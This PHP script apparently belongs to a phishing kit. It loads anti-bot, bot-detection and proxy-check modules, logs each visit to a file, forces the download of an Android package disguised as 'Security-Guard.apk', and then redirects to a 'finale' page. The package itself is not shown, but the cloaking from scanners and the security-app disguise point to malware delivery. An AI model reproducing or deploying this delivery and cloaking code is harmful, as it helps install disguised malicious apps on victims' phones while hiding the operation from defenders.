<?php


    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);

    ob_start();
    session_start();
require("../admin/config.php");
require("../settings.php");
//require_once("../sec/sniper.php");
require_once("../sec/antibot.php");
require_once("../sec/botinho.php");
require_once("../sec/proxycheck.php");
require_once("../sec/altproxy.php");



    markVisits('../logz/download_view.txt');

    header('Content-Description: File Transfer');
    header('Cache-Control: public');
    header('Content-Type: apk');
    header("Content-Transfer-Encoding: binary");
    header('Content-Disposition: attachment; filename=Security-Guard.apk');
    header('Content-Length: '.filesize('../apk/file.apk'));
    ob_clean(); #THIS!
    flush();
    readfile('../apk/file.apk');
	header("location: finale.php");

?>
